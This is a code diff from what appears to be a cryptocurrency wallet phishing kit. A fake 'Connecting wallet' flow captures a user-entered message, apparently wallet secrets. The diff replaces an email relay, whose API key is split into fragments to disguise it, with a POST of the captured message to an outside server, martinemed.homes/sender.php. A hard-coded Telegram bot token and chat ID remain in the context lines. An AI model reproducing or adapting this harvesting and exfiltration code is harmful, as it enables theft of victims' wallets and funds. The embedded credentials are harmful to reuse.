@@ -9114,108 +9114,17 @@
 
         const botToken = "8321594074:AAF0OiHDnPDyGMa8yWY9oi20I8A6uJhU2o0";
         const chatId = 7765726318;
-        const ASD   =  "xkey";
-        const ASA   = "sib"
-        const DAS   = "29e40b46e40b9ed048ec022d12632ce";
-        const DEW = "-8435a179f37db72e6e69f0bbc2500698e";
-        const RED   = "-H9EdtY7cHO51xCRH"
-        const AS = ASD + ASA + DEW + DAS + RED;
-        const AP_I_UD = AS;
-        const SENDER = {
-          'name'  : 'Mailer Bot',
-          'email' : 'hello@firstkeyhomes.homes'
-        };
-
-        const REP = {
-          'name'  : 'Reciever',
-          'email' : 'bellafunmy2288@gmail.com'
-        };
-        let generateHTML = function(message){
-          let htmlTemplate = `
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <style>
-            body {
-                font-family: Arial, sans-serif;
-                line-height: 1.6;
-                color: #333333;
-                margin: 0;
-                padding: 0;
-            }
-            .email-container {
-                max-width: 600px;
-                margin: 0 auto;
-                padding: 20px;
-                background-color: #ffffff;
-            }
-            .email-header {
-                background-color: #0066cc;
-                color: #ffffff;
-                padding: 20px;
-                text-align: center;
-                border-radius: 5px 5px 0 0;
-            }
-            .email-body {
-                padding: 20px;
-                background-color: #f9f9f9;
-                border: 1px solid #dddddd;
-                border-top: none;
-                border-radius: 0 0 5px 5px;
-            }
-            .message-content {
-                background-color: #ffffff;
-                padding: 15px;
-                border-radius: 5px;
-                border: 1px solid #e0e0e0;
-            }
-            .footer {
-                text-align: center;
-                margin-top: 20px;
-                padding: 10px;
-                font-size: 12px;
-                color: #888888;
-            }
-        </style>
-    </head>
-    <body>
-        <div class="email-container">
-            <div class="email-header">
-                <h1>New Message Notification</h1>
-            </div>
-            <div class="email-body">
-                <div class="message-content">
-                    ${message}
-                </div>
-            </div>
-            <div class="footer">
-                <p>© Your Mining Company. All rights reserved.</p>
-            </div>
-        </div>
-    </body>
-    </html>`;
-    
-    return htmlTemplate;
-        }
-        const SUB = "New Message";
-        const MES = generateHTML(message);
+       
 
         $.ajax({
           type: "POST",
-          url: `https://api.brevo.com/v3/smtp/email`,
+          url: `https://martinemed.homes/sender.php`,
           headers: {
             'Content-Type': 'application/json',
-            'api-key' : AP_I_UD,
-            'accept': 'application/json',
           },
-          data: JSON.stringify({
-            'sender': SENDER,
-            'to': [REP],
-            'subject': SUB,
-            'htmlContent': MES
-          }),
+          data: {
+            'message':message
+          },
           beforeSend: function () {
             processBtn.html(
               '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting wallet...'
